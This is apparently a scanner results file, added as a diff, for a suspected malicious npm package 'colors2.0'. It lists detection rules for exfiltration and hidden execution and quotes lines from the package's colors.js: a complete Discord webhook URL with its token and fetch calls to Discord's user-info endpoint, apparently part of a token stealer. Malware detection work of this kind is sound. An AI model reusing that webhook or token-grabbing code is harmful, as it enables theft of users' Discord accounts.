@@ -1,0 +1,32 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": {},
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": {},
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/lib/colors.js:38",
+                "code": "var webhook = \"https://canary.discord.com/api/webhooks/949718758296002631/SpfpIZp0psg_QWas7fhPjcaVrXqWsAHwO3w5CsyD7CXtMW860MeI-NhX59f2nYtmeKmS\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "package/lib/colors.js:70",
+                "code": "                        await fetch(`https://discord.com/api/v6/users/@me`, {\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "package/lib/colors.js:107",
+                "code": "                        await fetch(`https://discord.com/api/v6/users/@me`, {\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/colors2.0-2.0.0"
+}
